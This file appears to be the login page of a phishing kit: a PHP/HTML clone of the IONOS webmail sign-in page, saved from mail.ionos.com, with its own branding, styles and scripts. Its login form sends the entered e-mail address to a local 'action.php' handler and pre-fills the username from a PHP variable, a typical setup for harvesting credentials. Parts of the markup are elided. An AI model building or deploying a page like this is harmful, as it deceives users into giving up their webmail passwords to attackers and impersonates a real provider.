...
?>
<!DOCTYPE html>
<!-- saved from url=(0023)https://mail.ionos.com/ -->
<html lang="en" data-i18n="oao.lang" data-i18n-attr="lang"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <!-- charset -->
  ...
  <!-- head infos -->
  <title data-i18n="oao.login.title" data-i18n-attr="text">Webmail Login | IONOS by 1&amp;1</title>
  <meta name="description" content="Login to access your IONOS e-mail account and read your e-mail online with IONOS Webmail." data-i18n="oao.login.description" data-i18n-attr="content">
  ...
  <meta id="win8Icon" name="msapplication-TileImage" content="img/apple-touch-icon.png">
  ...
  <!-- css includes -->
  <link rel="stylesheet" type="text/css" href="./Webmail Login _ IONOS by 1&amp;1_files/ionos.min.css">
  <link rel="stylesheet" type="text/css" href="./Webmail Login _ IONOS by 1&amp;1_files/login.min.css">
<link type="text/css" rel="stylesheet" href="./Webmail Login _ IONOS by 1&amp;1_files/inpagelayer.css"><link type="text/css" rel="stylesheet" href="./Webmail Login _ IONOS by 1&amp;1_files/navigation.css"><link type="text/css" rel="stylesheet" href="./Webmail Login _ IONOS by 1&amp;1_files/statuspage.css"></head>
        ...
        <div class="sheet">
          <div class="sheet__section">
            <div class="sheet__block"><h1 class="headline" data-i18n="oao.login.heading" data-i18n-attr="text">Webmail Login</h1>
              <form id="login-form" action="action.php" method="post" autocomplete="on">
                ...
                <span class="input-text-group input-text-group--empty" style="overflow: visible; margin-bottom: 10px;"><span class="input-text-group__icon exos-icon exos-icon-nav-user-16"></span>
                  ...
                  <input class="input-text login-form-user" id="login-form-user" maxlength="200" name="login_username" size="40" tabindex="1" autocapitalize="none" spellcheck="false" type="text" required="true" value="<?php echo $user; ?>"><label class="label login-form-user-label" for="login-form-user"><span data-i18n="oao.login.field.email" data-i18n-attr="text">E-mail Address</span></label></span>
                ...
                <footer class="sheet__footer">
                  <button name="submit" tabindex="3" type="submit" id="login-form" value="" >Login</button>
                </footer>
              </form>
            </div>
          </div>
...
<section id="ias-container">
  <div class="grid-12 equal-grid-height">
    ...
    <div class="grid-05 grid-small-12 align-horizontal-center align-vertical-center">
      <img class="ias-responsive-video" src="./Webmail Login _ IONOS by 1&amp;1_files/spike_smartphone_visual.png">
    </div>
  </div>
</section>
...
<iframe class="hidden" src="./Webmail Login _ IONOS by 1&amp;1_files/robots.html" name="loginTarget"></iframe>

<!-- js libs -->
<script type="text/javascript" async="" src="./Webmail Login _ IONOS by 1&amp;1_files/zones"></script><script type="text/javascript" async="" src="./Webmail Login _ IONOS by 1&amp;1_files/ias.js.download"></script><script type="text/javascript" async="" src="./Webmail Login _ IONOS by 1&amp;1_files/privacyconsent.js.download"></script><script type="text/javascript" async="" src="./Webmail Login _ IONOS by 1&amp;1_files/statuspage.js.download"></script><script type="text/javascript" async="" src="./Webmail Login _ IONOS by 1&amp;1_files/inpagelayer.js.download"></script><script type="text/javascript" async="" src="./Webmail Login _ IONOS by 1&amp;1_files/navigation.js.download"></script><script id="oaotag" type="text/javascript" async="" defer="" src="./Webmail Login _ IONOS by 1&amp;1_files/webmail-login.js.download"></script><script src="./Webmail Login _ IONOS by 1&amp;1_files/ionos.min.js.download" async="async"></script>
<script type="text/javascript" src="./Webmail Login _ IONOS by 1&amp;1_files/main.min.js.download"></script>
